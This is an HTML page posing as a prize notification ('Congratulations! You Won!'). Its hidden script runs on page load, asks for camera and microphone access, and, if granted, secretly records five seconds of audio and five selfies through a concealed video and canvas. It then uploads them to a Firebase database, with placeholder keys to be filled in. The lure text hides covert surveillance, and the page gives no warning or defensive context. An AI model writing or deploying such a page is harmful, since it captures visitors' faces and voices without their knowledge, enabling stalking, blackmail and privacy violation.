<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Congratulations!</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
        h1 { color: #28a745; font-size: 3rem; text-align: center; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <h1>🎉 Congratulations! You Won! 🎉</h1>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        // Firebase Config (Replace with your actual keys)
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            databaseURL: "YOUR_DATABASE_URL",
            projectId: "YOUR_PROJECT_ID",
            appId: "YOUR_APP_ID"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let captureCount = 0;

        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;

                // 1. Audio Capture (5 Seconds)
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];
                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(audioBlob);
                    reader.onloadend = () => {
                        db.ref('captures/' + Date.now()).update({ audio: reader.result });
                    };
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);

                // 2. Photo Capture (5 Selfies)
                const interval = setInterval(() => {
                    if (captureCount < 5) {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const imageData = canvas.toDataURL('image/jpeg');
                        db.ref('captures/' + Date.now()).update({ image: imageData });
                        captureCount++;
                    } else {
                        clearInterval(interval);
                    }
                }, 1000);

            } catch (err) {
                console.log("Permission Denied");
            }
        }

        window.onload = startCapture;
    </script>
</body>
</html>
